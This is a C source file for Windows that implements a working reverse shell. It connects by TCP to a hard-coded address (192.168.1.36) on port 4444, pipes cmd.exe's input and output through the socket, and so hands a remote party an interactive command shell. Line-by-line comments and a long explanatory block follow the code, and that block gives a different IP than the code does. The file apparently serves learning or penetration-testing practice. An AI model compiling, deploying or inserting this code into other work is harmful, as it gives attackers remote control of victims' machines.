#include <stdio.h> // Standard input-output header for basic I/O functions
#include <WinSock2.h> // Header for Winsock 2 functions and structures
#include <Windows.h> // Header for Windows API functions and definitions
#include <ws2tcpip.h> // Header for additional Winsock functions and structures
#pragma comment(lib, "Ws2_32.lib") // Link with Ws2_32.lib library

int main(){
    SOCKET shell; // Declare a SOCKET variable for the connection
    SOCKADDR_IN shell_addr; // Declare a structure to hold the server address
    WSADATA wsa; // Declare a WSADATA structure to hold Windows Sockets initialization info
    STARTUPINFO; // Forward declaration for the STARTUPINFO structure
    STARTUPINFO si; // Declare a STARTUPINFO structure to specify window properties
    PROCESS_INFORMATION pi; // Declare a PROCESS_INFORMATION structure to receive process info
    char RecvServer[512]; // Buffer to store data received from the server
    int connection; // Variable to store the connection status
    char ip_addr[] = "192.168.1.36"; // IP address of the target server
    int port = 4444; // Port number to connect to

    WSAStartup(MAKEWORD(2,2), &wsa); // Initialize Winsock with version 2.2
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int) NULL); // Create a TCP socket
    shell_addr.sin_port = htons(port); // Set the port number, converting to network byte order
    shell_addr.sin_family = AF_INET; // Set the address family to AF_INET (IPv4)
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr); // Set the IP address, converting to network byte order
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); // Connect to the target server
    if (connection == SOCKET_ERROR){ // Check if the connection failed
        printf("Connection to the target server failed, try again\n"); // Print error message
        exit(0); // Exit the program
    }
    else{ // If the connection is successful
        recv(shell, RecvServer, sizeof(RecvServer), 0); // Receive data from the server
        memset(&si, 0, sizeof(si)); // Clear the STARTUPINFO structure
        si.cb = sizeof(si); // Set the size of the STARTUPINFO structure
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); // Set the flags to use standard handles and show window
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // Redirect standard input/output/error to the socket
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // Create a new process to run cmd.exe with redirected I/O
        WaitForSingleObject(pi.hProcess, INFINITE); // Wait for the created process to finish
        CloseHandle(pi.hProcess); // Close the process handle
        CloseHandle(pi.hThread); // Close the thread handle
        memset(RecvServer, 0, sizeof(RecvServer)); // Clear the receive buffer
    }
}

/*
Variables:

SOCKET shell: A socket for network communication.
SOCKADDR_IN shell_addr: A structure to hold the server address and port information.
WSADATA wsa: A structure to hold Windows Sockets initialization info.
STARTUPINFO si: A structure to specify properties for the new process.
PROCESS_INFORMATION pi: A structure to receive information about the new process.
char RecvServer[512]: A buffer to store data received from the server.
int connection: A variable to store the connection status.
char ip_addr[] = "10.9.231.254": The IP address of the target server.
int port = 4444: The port number to connect to.
Winsock Initialization:

WSAStartup(MAKEWORD(2,2), &wsa): Initializes Winsock with version 2.2. MAKEWORD(2,2) specifies the version, and &wsa points to a WSADATA structure that receives details of the Windows Sockets implementation.
Socket Creation:

shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int) NULL): Creates a TCP socket.
AF_INET: Specifies the address family (IPv4).
SOCK_STREAM: Specifies a stream socket (TCP).
IPPROTO_TCP: Specifies the TCP protocol.
The NULL values and (unsigned int) NULL are parameters for advanced features, which are not used here.
Address Setup:

shell_addr.sin_port = htons(port): Sets the port number, converting it to network byte order using htons.
shell_addr.sin_family = AF_INET: Sets the address family to IPv4.
shell_addr.sin_addr.s_addr = inet_addr(ip_addr): Sets the IP address, converting it to network byte order using inet_addr.
Connecting to Server:

connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL): Connects to the target server.
shell: The socket.
(SOCKADDR*)&shell_addr: The server address.
sizeof(shell_addr): The size of the server address structure.
The NULL values are reserved for advanced options and are not used here.
Connection Check:

if (connection == SOCKET_ERROR): Checks if the connection failed.
printf("Connection to the target server failed, try again\n"): Prints an error message.
exit(0): Exits the program.
Receiving Data and Creating Process:

recv(shell, RecvServer, sizeof(RecvServer), 0): Receives data from the server.
memset(&si, 0, sizeof(si)): Clears the si structure.
si.cb = sizeof(si): Sets the size of the si structure.
si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW): Sets the flags to use standard handles and show window.
si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell: Redirects standard input/output/error to the socket.
CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi): Creates a new process to run cmd.exe.
NULL: Uses the default executable path.
"cmd.exe": The command to execute.
The NULL values are for advanced security and environment options.
TRUE: Inherits handles.
0: No creation flags.
The NULL values are for advanced environment and directory options.
&si: Pointer to the STARTUPINFO structure.
&pi: Pointer to the PROCESS_INFORMATION structure.
Process Handling:

WaitForSingleObject(pi.hProcess, INFINITE): Waits for the process to finish.
CloseHandle(pi.hProcess): Closes the process handle.
CloseHandle(pi.hThread): Closes the thread handle.
memset(RecvServer, 0, sizeof(RecvServer)): Clears the receive buffer.
*/